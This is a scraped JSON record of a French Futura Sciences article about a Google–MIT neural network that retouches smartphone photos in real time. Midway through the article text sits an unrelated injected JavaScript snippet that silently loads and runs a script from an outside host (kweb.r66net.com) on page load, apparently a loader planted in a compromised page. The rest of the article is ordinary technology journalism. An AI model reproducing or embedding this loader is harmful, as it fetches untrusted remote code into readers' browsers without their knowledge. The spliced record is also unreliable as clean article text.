{"title": "Google et le MIT creent une IA pour retoucher vos photos en temps reel", "newspaper": "Futura Sciences", "author": ["Marc Zaffagni"], "date_publi": "2017-08-07", "content": "Google a collabore avec le MIT pour developper un algorithme d'apprentissage automatique si performant et econome en energie qu'il peut retoucher une image prise avec un smartphone en temps reel. Ce qu'il faut retenir Google travaille depuis longtemps sur la photographie computationnelle. La collaboration avec le MIT a permis de creer un reseau neuronal convolutif capable de faire de la retouche photo en temps reel, en s'executant directement sur un smartphone. Le programme ne prend pas plus de memoire de stockage qu'une photo numerique. Aujourd'hui, la plupart des  smartphones  et  applications  mobiles phares, comme Instagram, Snapchat ou Camera+, proposent des fonctions pour ameliorer les photos avant de les publier sur la Toile. Ces operations s'effectuent  a posteriori , sur la base du cliche initial enregistre par l'appareil photo. Mais peut-etre que dans un avenir pas tres lointain, les telephones mobiles sauront ameliorer les images avant meme que nous ayons appuye sur l'obturateur ! Google  et le  Massachusetts Institute of Technology  (MIT) ont developpe une  intelligence artificielle  (IA) basee sur un  reseau neuronal  convolutif d'apprentissage automatique capable de retoucher automatiquement, et en temps reel, les images, a la maniere d'un photographe professionnel avant que les cliches ne soient pris. Google a deja beaucoup travaille sur ce que l'on appelle << la  photographie  computationnelle >>, c'est-a-dire le fait de recourir a des algorithmes et des  logiciels  pour ameliorer l'image plutot que de rechercher la performance du cote du materiel. L'annee derniere, le geant californien a lance ses smartphones  Pixel  et Pixel XL, qui se sont rapidement imposes comme des references en  matiere  de photographie sur mobiles grace a un mode HDR ( high-dynamic-range  ou << grande gamme dynamique >>) particulierement efficace. Voici une image telle que la prendrait un smartphone sans intervention de l'IA de Google et du MIT. Le resultat avec intervention est a decouvrir ci-dessous. (c) MIT et Google                               Google et le MIT ont trouve deux  << astuces >> Mais ces technologies ont un grand defaut : elles demandent une importante puissance de calcul, ce qui se traduit par une consommation d' energie  plus importante. Deux facteurs qui ne font pas bon menage avec les smartphones. C'est la qu'est intervenu le MIT avec le travail de Michael Gharbi, un etudiant chercheur qui avait developpe une technique pour reduire la  bande passante  et la consommation d'energie du traitement d'images entre un  smartphone  et un  serveur  en ligne. Cela consistait a envoyer une version basse resolution d'une image vers le serveur, lequel renvoyait une  << recette de transformation >>  qui servait a retoucher la version haute resolution presente dans le mobile.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Google  et le MIT ont alors repris ces travaux avec l'objectif d'entrainer une IA a faire localement et plus vite ce que faisaient des serveurs. Les chercheurs se sont servis d'une  base de donnees  de 5.000 images, chacune retouchee par cinq photographes professionnels. Le nouveau  reseau neuronal convolutif  s'est appuye sur ces informations pour apprendre quelles ameliorations apporter a differentes images, comme, par exemple, diminuer la saturation, augmenter la  luminosite , corriger la balance des blancs, etc.  Mais comme ce travail s'effectue toujours sur une version basse resolution de l'image, afin de rester performant et peu energivore, il fallait trouver le moyen de compenser la perte d'information au niveau de chaque pixel pour pouvoir ensuite retravailler la version haute resolution d'une photo sans l'alterer. Pour cela, les chercheurs de Google et du MIT ont eu recours a ce qu'ils appellent deux  << astuces >> .  Le resultat une fois le processus de retouche en temps reel applique. (c) MIT et Google                               L'IA applique des formules mathematiques  Au lieu de produire une image complete, l'IA emet une serie de  << formules simples >>  pour modifier les  couleurs  des pixels d'une image. L'algorithme va evaluer la performance de ces formules en comparant l'image basse resolution retouchee, qui fait office d'etalon, a l'image haute resolution modifiee avec lesdites formules. Le systeme peut ainsi affiner de lui-meme la qualite de la retouche.  La seconde << astuce >> est une technique pour determiner de quelle maniere appliquer ces formules a chaque pixel de l'image haute resolution. Cela se fait grace a l'application d'une grille tridimensionnelle dont chaque cellule contient les formules de modification des valeurs colorimetriques des pixels. Grace a ces methodes mathematiques combinees, l'IA s'est averee capable de repliquer une image haute resolution HDR cent fois plus vite que l'algorithme d'origine.  Resultat : des images retouchees avec HDR peuvent s'afficher en temps reel sur l'ecran du smartphone sous forme d'une previsualisation avant que la photo ne soit enregistree. Selon le MIT et Google, la taille du programme equivaut a celle d'une photo  numerique , ce qui veut dire qu'un smartphone pourrait integrer plusieurs versions de l' IA  pour traiter les images selon differents  styles . A quand ces innovations dans les prochains Google Pixel ? ", "theme": "tech"}